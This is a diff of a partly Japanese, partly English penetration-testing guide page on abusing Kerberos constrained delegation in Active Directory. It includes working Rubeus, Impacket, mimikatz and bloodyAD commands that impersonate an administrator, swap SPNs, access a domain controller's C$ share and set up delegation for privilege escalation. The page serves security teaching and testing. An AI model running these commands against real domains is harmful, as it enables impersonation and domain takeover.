@@ -4,18 +4,18 @@
 
 ## Constrained Delegation
 
-これにより Domain admin は、あるコンピュータが任意のマシンの任意の **service** に対してユーザまたはコンピュータを **impersonate** することを **allow** できる。
+Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against any **service** of a machine.
 
-- **Service for User to self (_S4U2self_):** If a **service account** has a _userAccountControl_ value containing [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
-- **Service for User to Proxy(_S4U2proxy_):** **service account** は **msDS-AllowedToDelegateTo** に設定されたサービスに対して、任意のユーザに代わって TGS を取得できる。これを行うにはまずそのユーザから自分自身への TGS が必要だが、他の TGS を要求する前に S4U2self を使ってその TGS を取得できる。
+- **Service for User to self (_S4U2self_):** もし **service account** の _userAccountControl_ 値に [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) が含まれていれば、そのアカウントは任意の他ユーザーに代わって自身（サービス）用の TGS を取得できる。
+- **Service for User to Proxy(_S4U2proxy_):** ある **service account** は **msDS-AllowedToDelegateTo** に設定されたサービスに対して任意のユーザーに代わって TGS を取得できる。これを行うにはまずそのユーザーから自分宛ての TGS を得る必要があるが、S4U2self を使って先にその TGS を取得してから別の TGS を要求できる。
 
-**Note**: AD 上でユーザが ‘_Account is sensitive and cannot be delegated_ ’ とマークされている場合、そのユーザを **impersonate** することはできない。
+**Note**: AD でユーザーが ‘_Account is sensitive and cannot be delegated_’ とマークされている場合、そのユーザーを **impersonate** することはできない。
 
-これは、もし**compromise the hash of the service**した場合、ユーザを**impersonate users**し、対象マシン上の任意の**service**に代わって**access**を取得できる（結果として**privesc**の可能性）。
+This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to any **service** over the indicated machines (possible **privesc**).
 
-さらに、ユーザが偽装できるサービスだけでなく任意のサービスにもアクセスできる。これは SPN（要求されるサービス名）がチェックされないためで、チケット内のこの部分は暗号化/署名されていないためである。したがって、例えば **CIFS service** へアクセスできれば、Rubeus の `/altservice` フラグを使って **HOST service** にもアクセスできる。同じ SPN スワップの脆弱性は **Impacket getST -altservice** や他のツールでも悪用されている。
+Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked (in the ticket this part is not encrypted/signed). Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus for example. The same SPN swapping weakness is abused by **Impacket getST -altservice** and other tooling.
 
-また、**LDAP service access on DC** は **DCSync** を悪用するために必要となる。
+Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
 ```bash:Enumerate
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -29,18 +29,18 @@ ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
 # Generate TGT + TGS impersonating a user knowing the hash
 Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
 ```
-### Cross-domain constrained delegation notes (2025+)
+### Cross-domain constrained delegation の注意事項 (2025+)
 
-**Windows Server 2012/2012 R2** 以降、KDC は S4U2Proxy 拡張を通じて **constrained delegation across domains/forests** をサポートします。Modern builds (Windows Server 2016–2025) はこの動作を維持し、プロトコル遷移を示す 2 つの PAC SID を追加します:
+Windows Server 2012/2012 R2 以降、KDC は S4U2Proxy 拡張を通じてドメイン/フォレスト間での constrained delegation をサポートします。最近のビルド (Windows Server 2016–2025) はこの動作を維持し、プロトコル遷移を示すために 2 つの PAC SIDs を追加します:
 
-- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) ユーザーが通常の方法で認証した場合に付与されます。
-- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) サービスがプロトコル遷移を通じてアイデンティティを主張した場合に付与されます。
+- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) — ユーザーが通常の認証を行った場合。
+- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) — サービスがプロトコル遷移を介してアイデンティティを主張した場合。
 
-ドメイン間でプロトコル遷移が使用された場合、PAC 内に `SERVICE_ASSERTED_IDENTITY` が含まれていることが期待され、S4U2Proxy ステップが成功したことを確認できます。
+ドメイン間でプロトコル遷移が使用される場合、S4U2Proxy ステップが成功したことを確認するために PAC 内に `SERVICE_ASSERTED_IDENTITY` が含まれていることを期待してください。
 
 ### Impacket / Linux tooling (altservice & full S4U)
 
-Recent Impacket (0.11.x+) exposes the same S4U chain and SPN swapping as Rubeus:
+最近の Impacket (0.11.x+) は Rubeus と同じ S4U チェーンと SPN 交換を実装しています:
 ```bash
 # Get TGT for delegating service (hash/aes)
 getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d
@@ -54,19 +54,19 @@ getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
 export KRB5CCNAME=Administrator.ccache
 smbclient -k //dc.contoso.local/C$ -c 'dir'
 ```
-先にユーザーのSTを偽造する方が好みの場合（例：オフラインハッシュのみ）、S4U2Proxyには**ticketer.py**と**getST.py**を組み合わせて使用してください。現在の挙動については、オープンなImpacket issue #1713を参照してください（偽造したSTがSPNキーと一致しないとKRB_AP_ERR_MODIFIEDが発生します）。
+If you prefer forging the user ST first (e.g., offline hash only), pair **ticketer.py** with **getST.py** for S4U2Proxy. See the open Impacket issue #1713 for current quirks (KRB_AP_ERR_MODIFIED when the forged ST doesn't match the SPN key).
 
-### 低権限クレデンシャルからの委任設定の自動化
+### 低権限クレデンシャルからの delegation セットアップの自動化
 
-すでにコンピュータまたはサービスアカウントに対して**GenericAll/WriteDACL**を持っている場合、**bloodyAD**（2024+）を使ってRSAT不要で必要な属性をリモートに適用できます：
+もし既にコンピュータまたはサービスアカウントに対して **GenericAll/WriteDACL** を持っているなら、**RSAT** を使わずに **bloodyAD**（2024+）で必要な属性をリモートから設定できます:
 ```bash
 # Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
 ```
-これにより、これらの属性に書き込み可能になった時点で、DA権限なしにprivescのためのconstrained delegationパスを構築できます。
+これにより、これらの属性に書き込みができるようになった時点で、DA 権限なしに privesc のための constrained delegation パスを構築できます。
 
-- ステップ1: **許可されたサービスのTGTを取得する**
+- ステップ 1: **許可されたサービスの TGT を取得する**
 ```bash:Get TGT
 # The first step is to get a TGT of the service that can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -86,9 +86,9 @@ tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
 > [!WARNING]
-> Printer Bug や unconstrain delegation、NTLM relaying、Active Directory Certificate Service abuse のように、コンピュータ上で SYSTEM にならなくても、**TGT ticket** や **RC4**、**AES256** を取得する他の方法がある。
+> コンピュータ上でSYSTEMでなくても、Printer Bugやunconstrain delegation、NTLM relaying、Active Directory Certificate Service abuseのように、**TGT ticket**や**RC4**や**AES256**を取得する**他の方法**があります
 >
-> **その TGT ticket (or hashed) を持っているだけで、この攻撃をコンピュータ全体を侵害せずに実行できる。**
+> **そのTGT ticket（またはハッシュ化されたもの）を持っているだけで、コンピュータ全体を侵害せずにこの攻撃を実行できます。**
 
 - Step2: **ユーザーをなりすましてサービスのTGSを取得する**
 ```bash:Using Rubeus
@@ -118,7 +118,7 @@ tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.mo
 #Load the TGS in memory
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
 ```
-[**詳細は ired.team を参照してください。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) および [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) と [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 
 ## 参考資料
 - [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
